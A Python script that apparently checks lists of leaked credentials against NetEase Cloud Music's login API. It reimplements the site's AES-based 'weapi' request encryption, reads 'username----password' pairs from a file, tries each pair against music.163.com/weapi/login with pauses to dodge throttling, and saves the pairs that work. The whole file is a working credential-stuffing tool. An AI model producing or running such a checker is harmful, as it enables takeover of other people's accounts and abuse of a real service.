from Crypto.Cipher import AES
import hashlib
import requests
import execjs
import time
import json
import base64

param2 = "010001"
param3 = "00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7"
param4 = "0CoJUm6Qyw8W8jud"


def AES_encrypt(text, key, iv):
    pad = 16 - len(text) % 16
    text = text + pad * chr(pad)
    text = text.encode("utf-8")
    encryptor = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
    encrypt_text = encryptor.encrypt(text)
    encrypt_text = base64.b64encode(encrypt_text)
    return encrypt_text.decode('utf-8')


def asrsea(p1, p2, p3, p4):
    res = {}
    rand_num = "aq9d7cvBOJ1tzj1o"
    vi = b"0102030405060708"
    h_encText = AES_encrypt(p1, p4, vi)
    h_encText = AES_encrypt(h_encText, rand_num, vi)
    res["encText"] = h_encText
    res[
        "encSecKey"] = "5dec9ded1d7223302cc7db8d7e0428b04139743ab7e3d451ae47837f34e66f9a86f63e45ef20d147c33d88530a6c3c9d9d88e38586b42ee30ce43fbf3283a2b10e3118b76e11d6561d80e33ae38deb96832b1a358665c0579b1576b21f995829d45fc43612eede2ac243c6ebb6c2d16127742f3ac913d3ac7d6026b44cee424e"
    return res


def verification(username, password):
    # curr_time = int(time.time() * 1000)
    with open('./checkToken.js', 'r', encoding='utf-8') as f:
        tst = f.read()
    checkToken = execjs.compile(tst).call('get_token')
    param1 = json.dumps(
        {"username": username, "password": password, "rememberLogin": "true",
         "checkToken": checkToken})

    asrsea_res = asrsea(param1, param2, param3, param4)

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        "Referer": "https://music.163.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://music.163.com",
        "Host": "music.163.com"
    }

    param_data = {"params": asrsea_res["encText"],
                  "encSecKey": asrsea_res["encSecKey"]}

    r = requests.post("https://music.163.com/weapi/login?csrf_token=41f70bd238e6c0ed777e3320399baf60", headers=headers, data=param_data)
    return r.json()
    # for comment in json.loads(r.text)["data"]["comments"]:
    #     print(comment["content"])


if __name__ == '__main__':
    with open('1(1).txt', 'r', encoding='utf-8') as f:
        cont = f.readlines()

    for id in cont:
        username = id.split('----')[0]
        password1 = id.split('----')[1].strip()
        md5hash = hashlib.md5(password1.encode())
        password = md5hash.hexdigest()
        ress = verification(username, password)
        if ress['code'] == 200:
            with open('user_correct.txt','a+',encoding='utf-8') as f:
                f.write(f'{username}----{password1}\n')
            print('账号密码正确：',username,password1)
            time.sleep(5)
            continue
        if ress['code'] == 502:
            print('账号密码错误：',username,password1)
        else:
            print('异常：', ress)
            print(username, password1)

        time.sleep(5)

#a(kb, a[691], void 0)(e.concat(d, g));